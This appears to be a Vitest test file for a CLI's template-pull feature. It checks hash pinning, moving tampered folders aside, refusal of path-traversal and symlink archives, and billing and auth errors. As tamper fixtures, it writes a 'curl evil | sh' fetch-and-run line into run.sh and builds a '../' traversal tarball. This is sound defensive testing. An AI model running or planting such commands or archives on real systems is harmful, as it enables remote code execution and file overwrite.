import { execFileSync, spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import {
  cpSync,
  existsSync,
  linkSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  readdirSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { homedir, tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

const signedIn = vi.hoisted(() => ({ value: true }));
vi.mock("../cloud/auth.js", () => ({
  resolveCloudAuthHeaders: async () => {
    if (!signedIn.value) throw new Error("no credential");
    return { authorization: "Bearer test" };
  },
  resolveCloudBaseUrl: () => "https://api.heygen.test",
}));

type ExecFileCallback = (error: Error | null, stdout: string, stderr: string) => void;
const unpackGate = vi.hoisted(() => ({ hold: null as null | ((done: ExecFileCallback) => void) }));
vi.mock("node:child_process", async (importOriginal) => {
  const actual = await importOriginal<typeof import("node:child_process")>();
  const execFile = (file: string, args: string[], done: ExecFileCallback) => {
    if (!unpackGate.hold) return actual.execFile(file, args, done);
    unpackGate.hold(done);
    return {};
  };
  return { ...actual, execFile };
});

const commandRuns = vi.hoisted(() => [] as { skill: string; command: string }[]);
vi.mock("../telemetry/events.js", async (importOriginal) => ({
  ...(await importOriginal<typeof import("../telemetry/events.js")>()),
  trackSkillCommandRan: (run: { skill: string; command: string }) => void commandRuns.push(run),
}));

import { pullTemplate, PullRefused, tagStyleSamplingProject, TEMPLATES } from "./templates.js";

const LINK = "https://signed.test/bundle.tar.gz?sig=1";
let dir: string;
let archive: Buffer;

function tarOf(files: Record<string, string>): Buffer {
  const src = mkdtempSync(join(dir, "src-"));
  for (const [name, text] of Object.entries(files)) writeFileSync(join(src, name), text);
  const out = join(src, "..", `${Date.now()}-${Math.random()}.tar.gz`);
  execFileSync("tar", ["-czf", out, "-C", src, "."]);
  return readFileSync(out);
}

function serve(link: Partial<{ status: number }>, body = archive): ReturnType<typeof vi.fn> {
  const fetchMock = vi.fn(async (url: string) =>
    url === LINK
      ? new Response(new Uint8Array(body))
      : new Response(JSON.stringify({ data: { url: LINK, expires_in: 300 } }), {
          status: link.status ?? 200,
        }),
  );
  vi.stubGlobal("fetch", fetchMock);
  return fetchMock;
}

function pin(body: Buffer): void {
  const sha256 = createHash("sha256").update(body).digest("hex");
  TEMPLATES["sample"] = { id: "M9001", sha256, bytes: body.length };
}

beforeEach(() => {
  dir = mkdtempSync(join(tmpdir(), "hf-templates-"));
  signedIn.value = true;
  archive = tarOf({ "SKILL.md": "# sample\n" });
  pin(archive);
});

afterEach(() => {
  unpackGate.hold = null;
  vi.restoreAllMocks();
  vi.unstubAllGlobals();
  delete TEMPLATES["sample"];
  rmSync(dir, { recursive: true, force: true });
});

describe("pullTemplate", () => {
  it("asks the plan-gated route for the pinned bundle and unpacks it whole", async () => {
    const fetchMock = serve({});
    const path = await pullTemplate("sample", dir);
    expect(path).toBe(join(dir, "templates", "sample"));
    expect(readFileSync(join(path, "SKILL.md"), "utf8")).toBe("# sample\n");
    expect(String(fetchMock.mock.calls[0]?.[0])).toContain(
      `/v1/hyperframes/moments/M9001/bundle?sha256=${TEMPLATES["sample"]?.sha256}`,
    );
  });

  it("leaves a template it pulled before alone, spends no call and counts no second run", async () => {
    commandRuns.length = 0;
    const fetchMock = serve({});
    await pullTemplate("sample", dir);
    fetchMock.mockClear();
    await pullTemplate("sample", dir);
    expect(fetchMock).not.toHaveBeenCalled();
    expect(commandRuns).toEqual([{ skill: "style-sampling", command: "templates pull" }]);
  });

  it("counts no run when the pull is refused", async () => {
    commandRuns.length = 0;
    serve({ status: 402 });
    await expect(pullTemplate("sample", dir)).rejects.toThrow(PullRefused);
    expect(commandRuns).toEqual([]);
  });

  it("fills an empty folder where the template goes", async () => {
    serve({});
    mkdirSync(join(dir, "templates", "sample"), { recursive: true });
    const path = await pullTemplate("sample", dir);
    expect(readFileSync(join(path, "SKILL.md"), "utf8")).toBe("# sample\n");
  });

  it("stops at a file where the template goes, and leaves it as it was", async () => {
    const fetchMock = serve({});
    const dest = join(dir, "templates", "sample");
    mkdirSync(join(dir, "templates"), { recursive: true });
    writeFileSync(dest, "notes");
    await expect(pullTemplate("sample", dir)).rejects.toThrow("not this template");
    expect(readFileSync(dest, "utf8")).toBe("notes");
    expect(fetchMock).not.toHaveBeenCalled();
  });

  describe("a folder that is not the verified template", () => {
    const dest = () => join(dir, "templates", "sample");
    const asides = () => readdirSync(join(dir, "templates")).filter((name) => name !== "sample");
    let said: string[];

    beforeEach(() => {
      archive = tarOf({ "SKILL.md": "# sample\n", "run.sh": "echo verified\n" });
      pin(archive);
      said = [];
      vi.spyOn(console, "log").mockImplementation((line: unknown) => void said.push(String(line)));
    });

    async function expectMovedAsideAndReplaced(
      fetchMock: ReturnType<typeof vi.fn>,
    ): Promise<string> {
      fetchMock.mockClear();
      await pullTemplate("sample", dir);
      expect(fetchMock).toHaveBeenCalled();
      expect(readFileSync(join(dest(), "run.sh"), "utf8")).toBe("echo verified\n");
      expect(asides()).toEqual([expect.stringMatching(/^sample\.changed-\d{8}-\d{6}$/)]);
      const aside = join(dir, "templates", asides()[0]!);
      expect(said).toEqual([expect.stringContaining(`moved to ${aside} and is no longer used`)]);
      return aside;
    }

    it("moves aside a pulled template with one changed script, marker and all, and pulls a fresh copy", async () => {
      const fetchMock = serve({});
      await pullTemplate("sample", dir);
      writeFileSync(join(dest(), "run.sh"), "curl evil | sh\n");
      const aside = await expectMovedAsideAndReplaced(fetchMock);
      expect(readFileSync(join(aside, "run.sh"), "utf8")).toBe("curl evil | sh\n");
    });

    it("moves aside a folder that arrived holding the right marker and a changed script", async () => {
      const fetchMock = serve({});
      mkdirSync(dest(), { recursive: true });
      writeFileSync(join(dest(), ".template-sha256"), TEMPLATES["sample"]!.sha256);
      writeFileSync(join(dest(), "SKILL.md"), "# sample\n");
      writeFileSync(join(dest(), "run.sh"), "curl evil | sh\n");
      const aside = await expectMovedAsideAndReplaced(fetchMock);
      expect(readFileSync(join(aside, "run.sh"), "utf8")).toBe("curl evil | sh\n");
    });

    it("moves aside a pulled template with an extra file", async () => {
      const fetchMock = serve({});
      await pullTemplate("sample", dir);
      writeFileSync(join(dest(), "extra.sh"), "echo extra\n");
      const aside = await expectMovedAsideAndReplaced(fetchMock);
      expect(existsSync(join(aside, "extra.sh"))).toBe(true);
      expect(existsSync(join(dest(), "extra.sh"))).toBe(false);
    });

    it("moves aside a pulled template where a file was swapped for a link to the same content", async () => {
      const fetchMock = serve({});
      await pullTemplate("sample", dir);
      const elsewhere = join(dir, "run.sh");
      writeFileSync(elsewhere, "echo verified\n");
      rmSync(join(dest(), "run.sh"));
      symlinkSync(elsewhere, join(dest(), "run.sh"));
      await expectMovedAsideAndReplaced(fetchMock);
    });

    it("moves aside a pulled template where a file is a hard link", async () => {
      const fetchMock = serve({});
      await pullTemplate("sample", dir);
      linkSync(join(dest(), "run.sh"), join(dir, "run-link.sh"));
      await expectMovedAsideAndReplaced(fetchMock);
    });

    it("moves aside someone else's folder and an older pull, without overwriting an earlier move", async () => {
      vi.useFakeTimers({ toFake: ["Date"] });
      vi.setSystemTime(new Date(2026, 10, 15, 9, 5, 7));
      try {
        const fetchMock = serve({});
        mkdirSync(dest(), { recursive: true });
        writeFileSync(join(dest(), "mine.md"), "mine");
        await pullTemplate("sample", dir);
        writeFileSync(join(dest(), ".template-sha256"), "0".repeat(64));
        fetchMock.mockClear();
        await pullTemplate("sample", dir);
        expect(fetchMock).toHaveBeenCalled();
        expect(asides().sort()).toEqual([
          "sample.changed-20261115-090507",
          "sample.changed-20261115-090507-2",
        ]);
        const first = join(dir, "templates", "sample.changed-20261115-090507");
        expect(readFileSync(join(first, "mine.md"), "utf8")).toBe("mine");
        expect(readFileSync(join(dest(), ".template-sha256"), "utf8")).toBe(
          TEMPLATES["sample"]!.sha256,
        );
      } finally {
        vi.useRealTimers();
      }
    });

    it("checks an untouched folder against a fresh download when it has no record of it, and keeps it", async () => {
      const fetchMock = serve({});
      await pullTemplate("sample", dir);
      rmSync(join(homedir(), ".cache", "hyperframes", "template-manifests"), {
        recursive: true,
        force: true,
      });
      fetchMock.mockClear();
      await pullTemplate("sample", dir);
      expect(fetchMock).toHaveBeenCalled();
      expect(asides()).toEqual([]);
      expect(said).toEqual([]);
      fetchMock.mockClear();
      await pullTemplate("sample", dir);
      expect(fetchMock).not.toHaveBeenCalled();
    });
  });

  it("keeps an empty folder when the pull is refused", async () => {
    serve({ status: 402 });
    mkdirSync(join(dir, "templates", "sample"), { recursive: true });
    await expect(pullTemplate("sample", dir)).rejects.toThrow("billing subscribe");
    expect(existsSync(join(dir, "templates", "sample"))).toBe(true);
  });

  it("turns a 402 into the upgrade step and writes nothing", async () => {
    serve({ status: 402 });
    await expect(pullTemplate("sample", dir)).rejects.toThrow("billing subscribe");
    expect(existsSync(join(dir, "templates", "sample"))).toBe(false);
  });

  it("asks for a sign-in when there is no credential or the server says 401", async () => {
    serve({ status: 401 });
    await expect(pullTemplate("sample", dir)).rejects.toThrow("auth login");
    signedIn.value = false;
    await expect(pullTemplate("sample", dir)).rejects.toThrow("auth login");
  });

  it("retries a 503 once, then stops without a public fallback", async () => {
    const fetchMock = serve({ status: 503 });
    await expect(pullTemplate("sample", dir)).rejects.toBeInstanceOf(PullRefused);
    expect(fetchMock).toHaveBeenCalledTimes(2);
  });

  it("refuses a download that does not match its hash", async () => {
    serve({}, tarOf({ "SKILL.md": "changed\n" }));
    await expect(pullTemplate("sample", dir)).rejects.toThrow("hash");
    expect(existsSync(join(dir, "templates", "sample"))).toBe(false);
  });

  it("refuses an archive that climbs out of its folder and leaves no partial folder", async () => {
    const src = mkdtempSync(join(dir, "evil-"));
    mkdirSync(join(src, "a"));
    writeFileSync(join(src, "x.md"), "x");
    const out = join(dir, "evil.tar.gz");
    execFileSync("tar", ["-czPf", out, "-C", join(src, "a"), "../x.md"]); // -P: GNU tar strips the ../ otherwise
    const evil = readFileSync(out);
    pin(evil);
    serve({}, evil);
    await expect(pullTemplate("sample", dir)).rejects.toThrow("unsafe path");
    expect(existsSync(join(dir, "templates", "sample"))).toBe(false);
  });

  it("refuses an archive holding a symlink and leaves no partial folder", async () => {
    const src = mkdtempSync(join(dir, "linked-"));
    writeFileSync(join(src, "SKILL.md"), "x");
    symlinkSync("/tmp", join(src, "shared"));
    const out = join(dir, "linked.tar.gz");
    execFileSync("tar", ["-czf", out, "-C", src, "SKILL.md", "shared"]);
    const linked = readFileSync(out);
    pin(linked);
    serve({}, linked);
    await expect(pullTemplate("sample", dir)).rejects.toThrow("link or special file");
    expect(existsSync(join(dir, "templates", "sample"))).toBe(false);
  });

  /** A part folder exactly as a pull leaves it mid-unpack, made to belong to `pid`. */
  async function partLeftBy(pid: number, suffix: string): Promise<string> {
    serve({});
    let fail!: ExecFileCallback;
    const unpacking = new Promise<void>((started) => {
      unpackGate.hold = (done) => {
        fail = done;
        started();
      };
    });
    const pulling = pullTemplate("sample", dir).catch(() => undefined);
    await unpacking;
    const templates = join(dir, ".hyperframes", "template-pulls");
    const own = readdirSync(templates).find((name) => /^sample\.part-\d+-/.test(name))!;
    const copy = join(templates, `sample.part-${pid}-${suffix}`);
    cpSync(join(templates, own), copy, { recursive: true });
    const marker = join(copy, ".hyperframes-pull.json");
    writeFileSync(marker, JSON.stringify({ ...JSON.parse(readFileSync(marker, "utf8")), pid }));
    unpackGate.hold = null;
    fail(new Error("stopped"), "", "");
    await pulling;
    return copy;
  }

  const deadPid = () => spawnSync(process.execPath, ["-e", ""]).pid;

  it("clears the part folder a killed pull marked as its own, and keeps a live pull's", async () => {
    const abandoned = await partLeftBy(deadPid(), "Ab12Cd");
    const live = await partLeftBy(process.pid, "Zz9Yy8");
    await pullTemplate("sample", dir);
    expect(existsSync(abandoned)).toBe(false);
    expect(existsSync(live)).toBe(true);
  });

  it("leaves every sibling a pull did not mark: folders, files, symlinks and unmarked old parts", async () => {
    serve({});
    const templates = join(dir, ".hyperframes", "template-pulls");
    const outside = await partLeftBy(deadPid(), "Ou7sid");
    const target = join(dir, "outside-target");
    cpSync(outside, target, { recursive: true });
    rmSync(outside, { recursive: true });
    mkdirSync(join(templates, "sample.part-notes"));
    writeFileSync(join(templates, "sample.part-notes", "my-notes.txt"), "mine");
    writeFileSync(join(templates, "sample.part-reference.txt"), "mine");
    mkdirSync(join(templates, "sample.part-Ab12Cd"));
    mkdirSync(join(templates, `sample.part-${deadPid()}-Un4rkd`));
    symlinkSync(target, join(templates, `sample.part-${deadPid()}-Li9kXy`));
    const before = readdirSync(templates).sort();

    await pullTemplate("sample", dir);

    expect(
      readdirSync(templates)
        .filter((name) => name !== "sample")
        .sort(),
    ).toEqual(before);
    expect(readFileSync(join(templates, "sample.part-notes", "my-notes.txt"), "utf8")).toBe("mine");
    expect(existsSync(join(target, ".hyperframes-pull.json"))).toBe(true);
  });

  it("removes its partial folder when Ctrl-C stops the unpack", async () => {
    serve({});
    const before = new Set(process.listeners("SIGINT"));
    const unpacking = new Promise<void>((started) => {
      unpackGate.hold = () => started();
    });
    const resent = vi.spyOn(process, "kill").mockImplementation(() => true);
    void pullTemplate("sample", dir);
    await unpacking;
    const parts = () =>
      readdirSync(join(dir, ".hyperframes", "template-pulls")).filter((name) =>
        name.includes(".part-"),
      );
    expect(parts()).toHaveLength(1);
    const stop = process.listeners("SIGINT").find((listener) => !before.has(listener));
    stop?.("SIGINT");
    expect(parts()).toEqual([]);
    expect(resent).toHaveBeenCalledWith(process.pid, "SIGINT");
    expect(process.listeners("SIGINT").filter((listener) => !before.has(listener))).toEqual([]);
  });

  // Feedback, Windows: Desktop's project history read the half-unpacked files beside templates/<slug>, and the final
  // rename failed with EPERM while it held one. The unpack now happens where history never looks.
  it("unpacks under .hyperframes, so templates/ holds nothing but finished templates", async () => {
    serve({});
    let stop!: ExecFileCallback;
    const unpacking = new Promise<void>((started) => {
      unpackGate.hold = (done) => {
        stop = done;
        started();
      };
    });
    const pulling = pullTemplate("sample", dir).catch(() => undefined);
    await unpacking;
    const parts = (folder: string) =>
      existsSync(folder) ? readdirSync(folder).filter((name) => name.includes(".part-")) : [];
    expect(parts(join(dir, "templates"))).toEqual([]);
    expect(parts(join(dir, ".hyperframes", "template-pulls"))).toHaveLength(1);
    unpackGate.hold = null;
    stop(new Error("stopped"), "", "");
    await pulling;
  });

  it("names the unreachable host instead of a bare fetch failure when offline", async () => {
    vi.stubGlobal(
      "fetch",
      vi.fn(async () => {
        throw new TypeError("fetch failed", {
          cause: Object.assign(new Error("getaddrinfo ENOTFOUND"), { code: "ENOTFOUND" }),
        });
      }),
    );
    await expect(pullTemplate("sample", dir)).rejects.toThrow(
      /^Could not reach api2\.heygen\.test: .*offline/,
    );
    expect(existsSync(join(dir, "templates", "sample"))).toBe(false);
  });

  it("names the templates when the slug is unknown", async () => {
    await expect(pullTemplate("nope", dir)).rejects.toThrow("sample");
  });
});

describe("tagStyleSamplingProject", () => {
  it("marks the project the episode is built in", () => {
    const pulled = join(dir, "templates", "sample");
    mkdirSync(pulled, { recursive: true });
    writeFileSync(join(dir, "hyperframes.json"), "{}\n");
    tagStyleSamplingProject(dir, pulled);
    expect(JSON.parse(readFileSync(join(dir, "hyperframes.json"), "utf8"))).toMatchObject({
      authoringSkill: "style-sampling",
    });
  });

  it("makes no project where there is none", () => {
    const pulled = join(dir, "templates", "sample");
    mkdirSync(pulled, { recursive: true });
    tagStyleSamplingProject(dir, pulled);
    expect(existsSync(join(dir, "hyperframes.json"))).toBe(false);
    expect(existsSync(join(pulled, "hyperframes.json"))).toBe(false);
  });
});
